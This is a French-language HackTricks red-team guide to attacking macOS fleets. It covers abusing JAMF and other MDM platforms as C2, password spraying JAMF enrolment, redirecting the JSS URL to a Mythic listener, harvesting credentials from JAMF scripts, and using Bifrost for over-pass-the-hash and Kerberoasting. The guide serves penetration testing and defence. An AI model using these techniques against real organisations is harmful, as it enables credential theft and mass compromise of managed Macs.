# Red Teaming sur macOS

{{#include ../../banners/hacktricks-training.md}}


## Abus des MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Si vous parvenez à **compromettre des identifiants d'administrateur** pour accéder à la plateforme de gestion, vous pouvez **potentiellement compromettre tous les ordinateurs** en distribuant votre malware sur les machines.

Pour le red teaming dans les environnements MacOS, il est fortement recommandé de comprendre quelque peu le fonctionnement des MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Utiliser un MDM comme C2

Un MDM dispose des permissions nécessaires pour installer, interroger ou supprimer des profils, installer des applications, créer des comptes d'administrateur locaux, définir le mot de passe du firmware, modifier la clé FileVault...

Pour exécuter votre propre MDM, vous devez faire **signer votre CSR par un vendor**, ce que vous pouvez essayer d'obtenir avec [**https://mdmcert.download/**](https://mdmcert.download/). Pour exécuter votre propre MDM destiné aux appareils Apple, vous pouvez utiliser [**MicroMDM**](https://github.com/micromdm/micromdm).

Cependant, pour installer une application sur un appareil enrôlé, celle-ci doit toujours être signée par un compte développeur... toutefois, lors de l'enrôlement MDM, **l'appareil ajoute le certificat SSL du MDM comme CA de confiance**, vous pouvez donc désormais tout signer.<sup>[4]</sup>

Pour enrôler l'appareil dans un MDM, vous devez installer un fichier **`mobileconfig`** en tant que root, ce qui peut être livré via un fichier **pkg** (vous pouvez le compresser au format zip et, lorsqu'il est téléchargé depuis Safari, il sera décompressé).

L'**agent Mythic Orthrus** utilise cette technique.

### Abus de JAMF PRO

JAMF peut exécuter des **scripts personnalisés** (scripts développés par le sysadmin), des **payloads natifs** (création de comptes locaux, définition du mot de passe EFI, surveillance des fichiers/processus...) et du **MDM** (configurations des appareils, certificats des appareils...).<sup>[5]</sup>

#### Auto-enrôlement JAMF

Accédez à une page telle que `https://<company-name>.jamfcloud.com/enroll/` pour vérifier si l'**auto-enrôlement est activé**. Si c'est le cas, des **identifiants d'accès** peuvent vous être demandés.

Vous pouvez utiliser le script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) pour effectuer une attaque de password spraying.

De plus, après avoir trouvé des identifiants valides, vous pourriez être en mesure de brute-force d'autres noms d'utilisateur avec le formulaire suivant:

![Abus de JAMF PRO - Auto-enrôlement JAMF: De plus, après avoir trouvé des identifiants valides, vous pourriez être en mesure de brute-force d'autres noms d'utilisateur avec le formulaire suivant](<../../images/image (107).png>)

#### Authentification des appareils JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Le binaire **`jamf`** contenait le secret permettant d'ouvrir le keychain qui, au moment de la découverte, était **partagé entre tous** et était le suivant: **`jk23ucnq91jfu9aj`**.<sup>[5]</sup>\
De plus, jamf **persist** en tant que **LaunchDaemon** dans **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Prise de contrôle d'un appareil JAMF

L'**URL** du **JSS** (Jamf Software Server) que **`jamf`** utilisera se trouve dans **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ce fichier contient essentiellement l'URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Ainsi, un attaquant pourrait déposer un package malveillant (`pkg`) qui **écrase ce fichier** lors de son installation, en définissant l'**URL vers un listener Mythic C2 depuis un agent Typhon**, afin de pouvoir désormais abuser de JAMF comme C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Afin d'**impersonate la communication** entre un device et JMF, vous avez besoin de :

- L'**UUID** du device : `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Le **JAMF keychain** situé dans : `/Library/Application\ Support/Jamf/JAMF.keychain`, qui contient le certificat du device

Avec ces informations, **créez une VM** avec l'**UUID** Hardware **volé** et avec le **SIP désactivé**, déposez le **JAMF keychain**, **hookez** l'**agent** Jamf et volez ses informations.

#### Vol de secrets

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Vous pouvez également surveiller l'emplacement `/Library/Application Support/Jamf/tmp/` pour repérer les **custom scripts** que les admins pourraient vouloir exécuter via Jamf, car ils y sont **placés, exécutés puis supprimés**. Ces scripts **peuvent contenir des credentials**.

Cependant, des **credentials** peuvent être transmis à ces scripts sous forme de **paramètres**. Vous devez donc surveiller `ps aux | grep -i jamf` (même sans être root).

Le script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) peut écouter l'ajout de nouveaux fichiers ainsi que les nouveaux arguments de processus.

### Accès distant à macOS

Et également les **protocoles** **réseau** "spéciaux" de **MacOS** :


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Dans certains cas, vous constaterez que l'ordinateur **MacOS est connecté à un AD**. Dans ce scénario, vous devez essayer d'**énumérer** l'Active Directory comme vous en avez l'habitude. Vous trouverez de l'**aide** dans les pages suivantes :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Un **outil MacOS local** qui peut également vous aider est `dscl` :
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Il existe également des outils conçus pour MacOS afin d’énumérer automatiquement l’AD et d’interagir avec kerberos :

- [**Machound**](https://github.com/XMCyber/MacHound) : MacHound est une extension de l’outil d’audit Bloodhound permettant de collecter et d’ingérer les relations d’Active Directory sur des hôtes MacOS.<sup>[2]</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost) : Bifrost est un projet Objective-C conçu pour interagir avec les APIs Heimdal krb5 sur macOS. L’objectif du projet est de permettre de meilleurs tests de sécurité autour de Kerberos sur les appareils macOS en utilisant des APIs natives, sans nécessiter d’autre framework ou package sur la cible.
- [**Orchard**](https://github.com/its-a-feature/Orchard) : outil JavaScript for Automation (JXA) permettant d’effectuer une énumération d’Active Directory.

### Informations sur le domaine
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Utilisateurs

Les trois types d’utilisateurs MacOS sont les suivants :

- **Utilisateurs locaux** — Gérés par le service OpenDirectory local, ils ne sont d’aucune manière connectés à l’Active Directory.
- **Utilisateurs réseau** — Utilisateurs Active Directory volatils qui nécessitent une connexion au serveur DC pour s’authentifier.
- **Utilisateurs mobiles** — Utilisateurs Active Directory disposant d’une sauvegarde locale de leurs identifiants et de leurs fichiers.

Les informations locales sur les utilisateurs et les groupes sont stockées dans le dossier _/var/db/dslocal/nodes/Default._\
Par exemple, les informations sur l’utilisateur appelé _mark_ sont stockées dans _/var/db/dslocal/nodes/Default/users/mark.plist_ et les informations sur le groupe _admin_ se trouvent dans _/var/db/dslocal/nodes/Default/groups/admin.plist_.

En plus d’utiliser les relations HasSession et AdminTo, **MacHound ajoute trois nouvelles relations** à la base de données Bloodhound :<sup>[2]</sup>

- **CanSSH** - entité autorisée à utiliser SSH vers l’hôte
- **CanVNC** - entité autorisée à utiliser VNC vers l’hôte
- **CanAE** - entité autorisée à exécuter des scripts AppleEvent sur l’hôte
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Plus d'informations sur [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Mot de passe Computer$

Obtenez des mots de passe à l'aide de :
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Il est possible d'accéder au mot de passe **`Computer$`** dans le trousseau de clés System.

### Over-Pass-The-Hash

Obtenir un TGT pour un utilisateur et un service spécifiques :
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Une fois le TGT récupéré, il est possible de l’injecter dans la session actuelle avec :
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Avec les tickets de service obtenus, il est possible d’essayer d’accéder aux partages sur d’autres ordinateurs :
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Accéder au Keychain

Le Keychain contient très probablement des informations sensibles qui, si elles étaient consultées sans générer de prompt, pourraient aider à faire avancer un exercice de red team :


{{#ref}}
macos-keychain.md
{{#endref}}

## Services externes

Le Red Teaming de MacOS diffère d'un Red Teaming Windows classique, car **MacOS est généralement intégré directement à plusieurs plateformes externes**. Une configuration courante de MacOS consiste à accéder à l'ordinateur à l'aide d'**identifiants synchronisés avec OneLogin, et à accéder à plusieurs services externes** (comme github, aws...) via OneLogin.

## Techniques diverses de red team

### Safari

Lorsqu'un fichier est téléchargé dans Safari, s'il s'agit d'un fichier « sûr », il sera **ouvert automatiquement**. Ainsi, par exemple, si vous **téléchargez une archive zip**, elle sera automatiquement décompressée :

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Références

- [1] [Cueillir des pommes : Red Teaming des environnements MacOS en 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Présentation de MacHound : une solution aux attaques basées sur Active Directory ciblant macOS](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Commandes d'énumération de domaine (équivalents de dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Venez du côté obscur, nous avons des pommes : rendre la gestion de macOS malveillante](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0 : « Le point de vue d'un attaquant sur les configurations Jamf » - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
